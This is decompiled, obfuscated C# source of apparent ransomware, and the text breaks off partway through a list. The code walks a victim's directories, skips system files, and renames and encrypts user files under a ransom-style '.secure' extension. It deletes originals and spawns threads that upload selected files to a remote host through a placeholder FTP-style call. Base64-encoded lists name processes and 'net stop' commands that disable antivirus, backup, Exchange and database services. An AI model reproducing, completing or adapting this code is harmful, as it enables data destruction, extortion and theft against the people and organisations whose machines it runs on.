using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using VYRWosPndnHuY;

namespace LSMgrTguKYchoUzfqQ;

internal class VSCOSikLsIYu
{
	public class hBkSADqVuRNlqOY
	{
		private static StringCollection HPpfshbtyOnsP = new StringCollection();

		private static List<string> iHVdwbaqwpx = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(AKDOdYwKlSeS("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".secure[milleni5000@qq.com]") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(VXMsLRiDEpX))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(AZQbQvBePeaHIkYO) * 1024.0 * 1024.0 && CtXfnSgIllRtC == "YES")
							{
								iHVdwbaqwpx.Add(text);
							}
							else if (File.Exists(text) && CtXfnSgIllRtC == "NO")
							{
								iHVdwbaqwpx.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return iHVdwbaqwpx;
		}
	}

	[CompilerGenerated]
	private sealed class rQjGPIazwFEGV
	{
		public string DtMgcHTUyj;

		public bool _003CMain_003Eb__4(Process p)
		{
			return p.ProcessName == DtMgcHTUyj;
		}
	}

	[CompilerGenerated]
	private sealed class aQQpKNWRDUQaGb
	{
		private sealed class cFqsvtfpfdB
		{
			public aQQpKNWRDUQaGb dPnVBVUQmrgBtT;

			public string BbjYbYZilHRZD;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					TODKGZbpyhrvar(WindowsIdentity.GetCurrent().Name, BbjYbYZilHRZD);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				GPTiDckmIEiJjsVCA(BbjYbYZilHRZD, dPnVBVUQmrgBtT.IbbpQWdwLoB, dPnVBVUQmrgBtT.MAWxPnTQknKuz, dPnVBVUQmrgBtT.xvcrtqJtkNOelW, dPnVBVUQmrgBtT.ogPYbrutNaSIu);
			}
		}

		public string[] IbbpQWdwLoB;

		public string[] xvcrtqJtkNOelW;

		public string ogPYbrutNaSIu;

		public string MAWxPnTQknKuz;

		public void _003CCrypt_003Eb__1d(string t)
		{
			if (sedwieDsphpNS && !SpBshlcYoytUROp().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						TODKGZbpyhrvar(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (coIRNZWTDTfr == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					GPTiDckmIEiJjsVCA(t, IbbpQWdwLoB, MAWxPnTQknKuz, xvcrtqJtkNOelW, ogPYbrutNaSIu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				GPTiDckmIEiJjsVCA(t, IbbpQWdwLoB, MAWxPnTQknKuz, xvcrtqJtkNOelW, ogPYbrutNaSIu);
			}
		}
	}

	[CompilerGenerated]
	private sealed class jMdhabbWGSay
	{
		private sealed class wWafCMMgnXuKSU
		{
			public jMdhabbWGSay PWAEKXsGRiDf;

			public string OXLMCcDbwZnmOJS;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in cSaUketXdIT)
				{
					if (OXLMCcDbwZnmOJS.ToLower().EndsWith(item + PWAEKXsGRiDf.bqDAlpAGJyr) && LzQEwfyRsi == "YES")
					{
						if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > new FileInfo(OXLMCcDbwZnmOJS).Length)
						{
							try
							{
								TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", OXLMCcDbwZnmOJS);
							}
							catch
							{
							}
						}
					}
					else if (OXLMCcDbwZnmOJS.ToLower().EndsWith(item) && LzQEwfyRsi == "NO")
					{
						try
						{
							TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", OXLMCcDbwZnmOJS);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class VMQhereGmziO
		{
			public jMdhabbWGSay PWAEKXsGRiDf;

			public string eMJxwLsBZzTzHN;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in cSaUketXdIT)
				{
					if (eMJxwLsBZzTzHN.ToLower().EndsWith(item + PWAEKXsGRiDf.bqDAlpAGJyr) && LzQEwfyRsi == "YES")
					{
						if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > new FileInfo(eMJxwLsBZzTzHN).Length)
						{
							try
							{
								TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", eMJxwLsBZzTzHN);
							}
							catch
							{
							}
						}
					}
					else if (eMJxwLsBZzTzHN.ToLower().EndsWith(item) && LzQEwfyRsi == "NO")
					{
						try
						{
							TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", eMJxwLsBZzTzHN);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> zaBTclTxmNICJV;

		public List<string> bbyIpNECEcTLH;

		public string bqDAlpAGJyr;

		public string[] gWSgjUHmpGtAvr;

		public string WDdwjpHlSbuvG;

		public void _003CWorkerCrypter2_003Eb__2a(string t1)
		{
			string OXLMCcDbwZnmOJS;
			foreach (string item in bbyIpNECEcTLH)
			{
				if (gWSgjUHmpGtAvr.Length != 0)
				{
					string[] array = gWSgjUHmpGtAvr;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_05e6;
					}
				}
				try
				{
					if (item.EndsWith(bqDAlpAGJyr))
					{
						goto IL_05e6;
					}
				}
				catch (Exception)
				{
					goto IL_05e6;
				}
				if (!item.EndsWith(t1) || IBplFKRVOPC.Contains(item))
				{
					continue;
				}
				if (RLjMSFJztkabg == "YES")
				{
					try
					{
						if (gkqsFnLNsaPC.UuibpKQXVzQll(item))
						{
							gkqsFnLNsaPC.IbIrMsEgVUA(item);
						}
					}
					catch
					{
					}
				}
				IBplFKRVOPC.Add(item);
				if (!xoGEPqVelYnAq.Contains(Path.GetDirectoryName(item)))
				{
					xoGEPqVelYnAq.Add(Path.GetDirectoryName(item));
				}
				AyKKtsOHlSG(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (nsUlKTEfYADHHkY)
						{
							try
							{
								File.AppendAllText(DQNgDvGHNxeJ, "File: " + item + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00e5;
					}
					if (BeKYwfgbwwB == "YES" && new FileInfo(item).Length > Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024 && !zaBTclTxmNICJV.Contains(t1))
					{
						try
						{
							if (bqDAlpAGJyr != ".*")
							{
								File.Move(item, item + bqDAlpAGJyr);
							}
						}
						catch (Exception ex4)
						{
							if (nsUlKTEfYADHHkY)
							{
								try
								{
									File.AppendAllText(DQNgDvGHNxeJ, "File: " + item + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						OXLMCcDbwZnmOJS = "";
						if (bqDAlpAGJyr != ".*")
						{
							OXLMCcDbwZnmOJS = item + bqDAlpAGJyr;
						}
						else
						{
							OXLMCcDbwZnmOJS = item;
						}
						if (wfmEWWtWllHAhUQ == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in cSaUketXdIT)
								{
									if (OXLMCcDbwZnmOJS.ToLower().EndsWith(item2 + bqDAlpAGJyr) && LzQEwfyRsi == "YES")
									{
										if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > new FileInfo(OXLMCcDbwZnmOJS).Length)
										{
											try
											{
												TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", OXLMCcDbwZnmOJS);
											}
											catch
											{
											}
										}
									}
									else if (OXLMCcDbwZnmOJS.ToLower().EndsWith(item2) && LzQEwfyRsi == "NO")
									{
										try
										{
											TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", OXLMCcDbwZnmOJS);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = UuNYUWgMzNDBWsZ.xPvAvaAnETudxSt(32);
						string s = IyNwnTsFDBq.QaROgAqvhnuv(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = NLyEBDclVkby.trQgagTyanuA(OXLMCcDbwZnmOJS, Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024);
						NLyEBDclVkby.aMuoWrgJGubRR(BwoldggmWz: (!mycxcOOgXQRz) ? (UAlXLRmTzVC ? NLyEBDclVkby.uLYqguvCGZXF(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NLyEBDclVkby.uLYqguvCGZXF(array3, Encoding.ASCII.GetBytes(WDdwjpHlSbuvG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UAlXLRmTzVC ? gmbpOOqXTPC.luhQvjGvnCGKIw(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gmbpOOqXTPC.luhQvjGvnCGKIw(array3, Encoding.ASCII.GetBytes(WDdwjpHlSbuvG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ERhyBPUuEpFw: OXLMCcDbwZnmOJS, QkwxraZpWpqtj: bytes);
					}
					else
					{
						string text2 = UuNYUWgMzNDBWsZ.xPvAvaAnETudxSt(32);
						string s2 = IyNwnTsFDBq.QaROgAqvhnuv(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (bqDAlpAGJyr != ".*")
						{
							if (!FmlwPIlyMKyrWsO)
							{
								if (!UAlXLRmTzVC)
								{
									syAUxlbcKlOS(item, item + bqDAlpAGJyr, DpIdTjeHJcSMdxf);
								}
								else
								{
									syAUxlbcKlOS(item, item + bqDAlpAGJyr, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!UAlXLRmTzVC)
									{
										sYNOQnJviugUg(item, item + bqDAlpAGJyr, DpIdTjeHJcSMdxf);
									}
									else
									{
										sYNOQnJviugUg(item, item + bqDAlpAGJyr, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (nsUlKTEfYADHHkY)
									{
										try
										{
											File.AppendAllText(DQNgDvGHNxeJ, "File: " + item + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!FmlwPIlyMKyrWsO)
						{
							if (!UAlXLRmTzVC)
							{
								syAUxlbcKlOS(item, item + ".part", DpIdTjeHJcSMdxf);
							}
							else
							{
								syAUxlbcKlOS(item, item + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!UAlXLRmTzVC)
								{
									sYNOQnJviugUg(item, item, DpIdTjeHJcSMdxf);
								}
								else
								{
									sYNOQnJviugUg(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (nsUlKTEfYADHHkY)
								{
									try
									{
										File.AppendAllText(DQNgDvGHNxeJ, "File: " + item + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (UAlXLRmTzVC)
						{
							if (bqDAlpAGJyr != ".*")
							{
								SAgbiLoigZOwPPj(item + bqDAlpAGJyr, bytes2);
							}
							else
							{
								SAgbiLoigZOwPPj(item, bytes2);
							}
						}
					}
					goto IL_05e6;
					end_IL_00e5:;
				}
				catch (Exception)
				{
					goto IL_05e6;
				}
				continue;
				IL_05e6:
				bbyIpNECEcTLH.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string fileInfo)
		{
			if (gWSgjUHmpGtAvr.Length != 0)
			{
				string[] array = gWSgjUHmpGtAvr;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0676;
				}
			}
			try
			{
				if (fileInfo.EndsWith(bqDAlpAGJyr))
				{
					goto IL_0676;
				}
			}
			catch (Exception)
			{
				goto IL_0676;
			}
			if (!IBplFKRVOPC.Contains(fileInfo))
			{
				if (RLjMSFJztkabg == "YES")
				{
					try
					{
						if (gkqsFnLNsaPC.UuibpKQXVzQll(fileInfo))
						{
							gkqsFnLNsaPC.IbIrMsEgVUA(fileInfo);
						}
					}
					catch
					{
					}
				}
				IBplFKRVOPC.Add(fileInfo);
				if (!xoGEPqVelYnAq.Contains(Path.GetDirectoryName(fileInfo)))
				{
					xoGEPqVelYnAq.Add(Path.GetDirectoryName(fileInfo));
				}
				AyKKtsOHlSG(fileInfo);
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_010d;
						}
						goto end_IL_010d_2;
						end_IL_010d:;
					}
					catch (Exception ex2)
					{
						if (nsUlKTEfYADHHkY)
						{
							try
							{
								File.AppendAllText(DQNgDvGHNxeJ, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_010d_2;
					}
					if (BeKYwfgbwwB == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024)
					{
						try
						{
							if (bqDAlpAGJyr != ".*")
							{
								File.Move(fileInfo, fileInfo + bqDAlpAGJyr);
							}
						}
						catch (Exception ex4)
						{
							if (nsUlKTEfYADHHkY)
							{
								try
								{
									File.AppendAllText(DQNgDvGHNxeJ, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (bqDAlpAGJyr != ".*")
						{
							fileInfo += bqDAlpAGJyr;
						}
						if (wfmEWWtWllHAhUQ == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in cSaUketXdIT)
								{
									if (fileInfo.ToLower().EndsWith(item + bqDAlpAGJyr) && LzQEwfyRsi == "YES")
									{
										if (Convert.ToInt32(DYczLekywXO) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item) && LzQEwfyRsi == "NO")
									{
										try
										{
											TZtvpaeBArDn.OZyIhSfVXkqPJk("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = UuNYUWgMzNDBWsZ.xPvAvaAnETudxSt(32);
						string s = IyNwnTsFDBq.QaROgAqvhnuv(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = NLyEBDclVkby.trQgagTyanuA(fileInfo, Convert.ToInt32(ZfdjrMLRfIrcx) * 1024 * 1024);
						NLyEBDclVkby.aMuoWrgJGubRR(BwoldggmWz: (!mycxcOOgXQRz) ? (UAlXLRmTzVC ? NLyEBDclVkby.uLYqguvCGZXF(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NLyEBDclVkby.uLYqguvCGZXF(array3, Encoding.ASCII.GetBytes(WDdwjpHlSbuvG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UAlXLRmTzVC ? gmbpOOqXTPC.luhQvjGvnCGKIw(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gmbpOOqXTPC.luhQvjGvnCGKIw(array3, Encoding.ASCII.GetBytes(WDdwjpHlSbuvG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ERhyBPUuEpFw: fileInfo, QkwxraZpWpqtj: bytes);
					}
					else
					{
						string text2 = UuNYUWgMzNDBWsZ.xPvAvaAnETudxSt(32);
						string s2 = IyNwnTsFDBq.QaROgAqvhnuv(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (bqDAlpAGJyr != ".*")
						{
							if (!FmlwPIlyMKyrWsO)
							{
								if (!UAlXLRmTzVC)
								{
									syAUxlbcKlOS(fileInfo, fileInfo + bqDAlpAGJyr, DpIdTjeHJcSMdxf);
								}
								else
								{
									syAUxlbcKlOS(fileInfo, fileInfo + bqDAlpAGJyr, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!UAlXLRmTzVC)
									{
										sYNOQnJviugUg(fileInfo, fileInfo + bqDAlpAGJyr, DpIdTjeHJcSMdxf);
									}
									else
									{
										sYNOQnJviugUg(fileInfo, fileInfo + bqDAlpAGJyr, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (nsUlKTEfYADHHkY)
									{
										try
										{
											File.AppendAllText(DQNgDvGHNxeJ, "File: " + fileInfo + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!FmlwPIlyMKyrWsO)
						{
							if (!UAlXLRmTzVC)
							{
								syAUxlbcKlOS(fileInfo, fileInfo + ".part", DpIdTjeHJcSMdxf);
							}
							else
							{
								syAUxlbcKlOS(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!UAlXLRmTzVC)
								{
									sYNOQnJviugUg(fileInfo, fileInfo, DpIdTjeHJcSMdxf);
								}
								else
								{
									sYNOQnJviugUg(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (nsUlKTEfYADHHkY)
								{
									try
									{
										File.AppendAllText(DQNgDvGHNxeJ, "File: " + fileInfo + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (UAlXLRmTzVC)
						{
							if (bqDAlpAGJyr != ".*")
							{
								SAgbiLoigZOwPPj(fileInfo + bqDAlpAGJyr, bytes2);
							}
							else
							{
								SAgbiLoigZOwPPj(fileInfo, bytes2);
							}
						}
					}
					end_IL_010d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0676;
			IL_0676:
			bbyIpNECEcTLH.Remove(fileInfo);
		}
	}

	[CompilerGenerated]
	private sealed class VFZvUOhFzXY
	{
		public string yQXLtgzMREedj;

		public string ZdAMKxqretWz;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(yQXLtgzMREedj);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(ZdAMKxqretWz))
					{
						File.Delete(ZdAMKxqretWz);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string XKrsfDFRFRzXq = "EVET";

	public static string[] dvDWFuWUSzh;

	public static IEnumerable<DirectoryInfo> XOgKraVSOTRu;

	public static byte[] DpIdTjeHJcSMdxf = null;

	public static DirectoryInfo ByrhnKgVNZRSw;

	public static string CtXfnSgIllRtC = "NO";

	public static string AZQbQvBePeaHIkYO = "100000000";

	public static List<string> VixAiWNPKoHGQJKOH = new List<string>();

	public static List<string> nZeGHvgtcFPS = new List<string>();

	public static string xMbixIuWpo = "NO";

	public static string WDdwjpHlSbuvG = "";

	public static string dQEfVjRKWpm = "";

	public static string bSyUfZwXGGEua = "NO";

	public static int CYZbidaVfjgJHFe = 0;

	public static string RLjMSFJztkabg = "NO";

	public static string ohMMkYcOdZLutOP = "NO";

	public static string vbLJiZdMThMpD = "NO";

	public static string OBMqmboFpzp = "0";

	public static string tzlBtHbvtkN = "NO";

	public static string isMlvWhJuLNfEt = "NO";

	public static string LHlzzSAUkgRB = "NO";

	public static string FWugbVVzWRUMz = "NO";

	public static List<string> JtOibaAPGaaK = new List<string>
	{
		AKDOdYwKlSeS("bHNhc3MuZXhl"),
		AKDOdYwKlSeS("c3ZjaHN0LmV4ZQ=="),
		AKDOdYwKlSeS("Y3Jjc3MuZXhl"),
		AKDOdYwKlSeS("Y2hyb21lMzIuZXhl"),
		AKDOdYwKlSeS("ZmlyZWZveC5leGU="),
		AKDOdYwKlSeS("Y2FsYy5leGU="),
		AKDOdYwKlSeS("bXlzcWxkLmV4ZQ=="),
		AKDOdYwKlSeS("ZGxsaHN0LmV4ZQ=="),
		AKDOdYwKlSeS("b3BlcmEzMi5leGU="),
		AKDOdYwKlSeS("bWVtb3AuZXhl"),
		AKDOdYwKlSeS("c3Bvb2xjdi5leGU="),
		AKDOdYwKlSeS("Y3RmbW9tLmV4ZQ=="),
		AKDOdYwKlSeS("U2t5cGVBcHAuZXhl")
	};

	public static List<string> xoGEPqVelYnAq = new List<string>();

	public static string pzapAtVkNZv = "NO";

	public static string LdMgmNuRjMHdP = "NO";

	public static string DuQoVlFFygDLtHYR = "NO";

	public static List<string> IBplFKRVOPC = new List<string>();

	public static string chdVxkZdWfF = "NO";

	private static string QLVXBaHzUbUy = "10f49215-5431-4198-a421-d3866df721ed";

	public static string coIRNZWTDTfr = "NO";

	public static string IjNtEctlirD = "NO";

	public static List<string> ZZWNuPwHETb = new List<string>
	{
		AKDOdYwKlSeS("c3RhcnQgRG5zY2FjaGUgL3k="),
		AKDOdYwKlSeS("c3RhcnQgRkRSZXNQdWIgL3k="),
		AKDOdYwKlSeS("c3RhcnQgU1NEUFNSViAveQ=="),
		AKDOdYwKlSeS("c3RhcnQgdXBucGhvc3QgL3k="),
		AKDOdYwKlSeS("c3RvcCBhdnBzdXMgL3k="),
		AKDOdYwKlSeS("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBtZmV3YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBEZWZXYXRjaCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBjY0V2dE1nciAveQ=="),
		AKDOdYwKlSeS("c3RvcCBjY1NldE1nciAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTYXZSb2FtIC95"),
		AKDOdYwKlSeS("c3RvcCBSVFZzY2FuIC95"),
		AKDOdYwKlSeS("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		AKDOdYwKlSeS("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBZb29CYWNrdXAgL3k="),
		AKDOdYwKlSeS("c3RvcCBZb29JVCAveQ=="),
		AKDOdYwKlSeS("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		AKDOdYwKlSeS("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		AKDOdYwKlSeS("c3RvcCBWU05BUFZTUyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCB2ZWVhbSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		AKDOdYwKlSeS("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBBY3JTY2gyU3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		AKDOdYwKlSeS("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBzb3Bob3MgL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		AKDOdYwKlSeS("c3RvcCBJSVNBZG1pbiAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		AKDOdYwKlSeS("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		AKDOdYwKlSeS("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		AKDOdYwKlSeS("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		AKDOdYwKlSeS("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		AKDOdYwKlSeS("c3RvcCBTYW1TcyAveQ=="),
		AKDOdYwKlSeS("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		AKDOdYwKlSeS("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		AKDOdYwKlSeS("c3RvcCBQT1AzU3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		AKDOdYwKlSeS("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		AKDOdYwKlSeS("c3RvcCBTTVRQU3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		AKDOdYwKlSeS("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		AKDOdYwKlSeS("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		AKDOdYwKlSeS("c3RvcCBTc3RwU3ZjIC95"),
		AKDOdYwKlSeS("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
